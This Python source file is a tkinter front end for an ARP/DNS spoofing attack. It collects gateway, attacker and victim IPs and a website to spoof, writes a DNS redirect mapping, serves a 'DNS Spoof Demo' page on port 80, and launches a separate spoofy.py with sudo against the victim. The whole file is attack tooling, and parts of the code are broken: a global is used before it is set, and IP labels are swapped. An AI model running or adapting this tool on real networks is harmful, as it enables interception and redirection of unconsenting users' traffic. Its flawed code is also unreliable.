import os
import threading
import subprocess
import webbrowser
import socket
import tkinter as tk
from tkinter import messagebox

# Function to get the local IP address dynamically
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


# Paths and constants
PROJECT_PATH = os.path.dirname(os.path.abspath(__file__))
SPOOFY_PATH = os.path.join(PROJECT_PATH, "spoofy.py")
DNS_FILE = os.path.join(PROJECT_PATH, "dnsSpoofed.txt")
SPOOF_SITE_FOLDER = os.path.join(PROJECT_PATH, "spoof_site")
INDEX_HTML_PATH = os.path.join(SPOOF_SITE_FOLDER, "index.html")

def save_values(gateway_ip, victim_ip, spoof_website):
    if not gateway_ip or not victim_ip or not spoof_website:
        messagebox.showerror("Error", "All fields must be filled in.")
        return False

    # Save DNS spoof info
    with open(DNS_FILE, "w") as f:
        f.write(f"{spoof_website}:{attacker_ip_var.get().strip()}\n")
    
    # Generate the spoof HTML page
    html_content = f"""
<!DOCTYPE html>
<html>
<head>
<title>Custom Spoof Page</title>
</head>
<body style="text-align:center; margin-top:50px; font-family:Arial;">
<h1>DNS Spoof Demo</h1>
<p>Website spoofed: <b>{spoof_website}</b></p>
<p>Attacker IP: <b>{gateway_ip}</b></p>
<p>Victim IP: <b>{victim_ip}</b></p>
</body>
</html>
"""
    with open(INDEX_HTML_PATH, "w") as f:
        f.write(html_content)

    return True

def run_spoofy():
    cmd = [
        "sudo",
        "python3",
        SPOOFY_PATH,
        "-t",
        victim_ip_var.get(),
        "-g",
        gateway_ip_var.get(),
        "-d",
        DNS_FILE
    ]
    try:
        subprocess.run(cmd, check=True)
        # Open index.html instead of the real website
        webbrowser.open(IP_ADDRESS + "/index.html")
        messagebox.showinfo("Success", "Spoofy script started and webpage opened.")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"Failed to run script: {e}")

def start_http_server():
    os.chdir(SPOOF_SITE_FOLDER)
    # Check if port 80 is free
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        if sock.connect_ex(('127.0.0.1', 80)) == 0:
            messagebox.showerror("Error", "Port 80 is already in use.")
            return
    from http.server import SimpleHTTPRequestHandler
    from socketserver import TCPServer
    with TCPServer(("", 80), SimpleHTTPRequestHandler) as httpd:
        print("Serving at port 80")
        httpd.serve_forever()

def on_save():
    global IP_ADDRESS
    gateway_ip = gateway_ip_var.get().strip()
    victim_ip = victim_ip_var.get().strip()
    spoof_website = website_var.get().strip()
    attacker_ip = attacker_ip_var.get().strip()
    if save_values(gateway_ip, victim_ip, spoof_website):
        # Start server thread
        threading.Thread(target=start_http_server, daemon=True).start()
        # Run spoof script
        run_spoofy()
    # Set IP_ADDRESS dynamically
    IP_ADDRESS = "http://" + victim_ip_var.get()


# Create the UI
root = tk.Tk()
root.title("ARP/DNS Spoof Configuration Tool")
root.geometry("500x300")
root.resizable(False, False)

# Input fields
tk.Label(root, text="Gateway", font=("Arial", 11)).pack(pady=5)
gateway_ip_var = tk.StringVar()
tk.Entry(root, textvariable=gateway_ip_var, width=40).pack()

tk.Label(root, text="Attacker IP:", font=("Arial", 11)).pack(pady=5)
attacker_ip_var = tk.StringVar()
tk.Entry(root, textvariable=attacker_ip_var, width=40).pack()

tk.Label(root, text="Victim IP:", font=("Arial", 11)).pack(pady=5)
victim_ip_var = tk.StringVar()
tk.Entry(root, textvariable=victim_ip_var, width=40).pack()

tk.Label(root, text="Website to Spoof (e.g., example.org):", font=("Arial", 11)).pack(pady=5)
website_var = tk.StringVar()
tk.Entry(root, textvariable=website_var, width=40).pack()

# Button
tk.Button(root, text="Save & Run", command=on_save, width=20, height=2).pack(pady=15)

# Run the UI
root.mainloop()
